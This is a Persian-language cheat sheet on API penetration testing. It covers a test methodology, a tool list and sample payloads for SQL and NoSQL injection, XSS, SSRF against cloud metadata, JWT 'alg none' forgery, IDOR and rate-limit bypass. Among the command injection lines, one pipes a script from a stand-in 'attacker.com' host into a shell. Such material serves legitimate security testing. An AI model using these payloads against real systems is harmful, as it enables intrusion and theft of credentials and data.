# api


مراحل کلی تست نفوذ API
شناسایی و مستندسازی API

پیدا کردن endpointها با استفاده از:

مستندات رسمی (Swagger, Postman)

ابزارهای تست (Burp Suite, OWASP ZAP)

فایل‌های لو رفته (swagger.json, openapi.json)

Reverse Engineering اپلیکیشن یا PWA

شناسایی متدها (GET, POST, PUT, DELETE, PATCH) و پارامترها.

بررسی احراز هویت و مجوز (Auth & Access Control)

تست توکن‌ها (JWT, API Key)

تست Broken Authentication (ورود بدون رمز، JWT بدون امضا)

تست Broken Access Control (IDOR: تغییر user_id و دسترسی به داده دیگران)

تست اعتبارسنجی ورودی‌ها

بررسی ورودی‌ها برای XSS، SQLi، NoSQLi، Command Injection، SSRF.

استفاده از payload های مناسب هر آسیب‌پذیری.

تست منطق بیزینسی (Logical flaws)

دور زدن محدودیت‌ها (Rate Limit Bypass، تغییر قیمت کالا، دوبار انجام تراکنش)

تست ترتیب درخواست‌ها (Race Conditions)

تست امنیت انتقال داده‌ها

اطمینان از استفاده از HTTPS

بررسی برای Sensitive Data Exposure

ابزارهای مفید

Postman / Insomnia (برای درخواست‌های دستی)

Burp Suite / OWASP ZAP (برای رهگیری و تزریق)

ffuf / wfuzz (برای brute-force روی پارامترها و endpointها)

nuclei (برای اسکن خودکار API)


======================================================================


نمونه پیلودها برای تست نفوذ API
1. SQL Injection

```
' OR 1=1 --
" OR "1"="1
1') UNION SELECT null,null,null--
```
نمونه تست در پارامتر:

```
POST /api/user
{"id": "' OR 1=1 --"}
```

2. NoSQL Injection (MongoDB)

```
{"username": {"$ne": null}, "password": {"$ne": null}}
{"username": {"$gt": ""}, "password": {"$gt": ""}}
```

4. XSS (برای APIهایی که خروجی HTML دارند)

```
<script>alert(1)</script>
"><img src=x onerror=alert(1)>
```

4. Command Injection

```
; cat /etc/passwd
&& ping -c 1 attacker.com
| curl http://attacker.com/shell.sh | sh
```

5. SSRF

```
{"url": "http://127.0.0.1:8080/admin"}
{"url": "file:///etc/passwd"}
{"url": "http://169.254.169.254/latest/meta-data/"} // AWS metadata
```

6. JWT Manipulation
حذف امضا یا تغییر الگوریتم:

```
{"alg": "none", "typ": "JWT"}
```
تغییر payload:

```
{"role": "admin"}
```

7. IDOR (Insecure Direct Object Reference)
تغییر شناسه در URL یا Body:

```
GET /api/user/123
GET /api/user/124   // باید داده کاربر دیگر نمایش داده نشود
```

8. Rate Limit Bypass
ارسال تعداد زیادی درخواست پشت سر هم با:

```
ffuf -u https://target/api/send_otp -w phone_numbers.txt
```

=================================================================
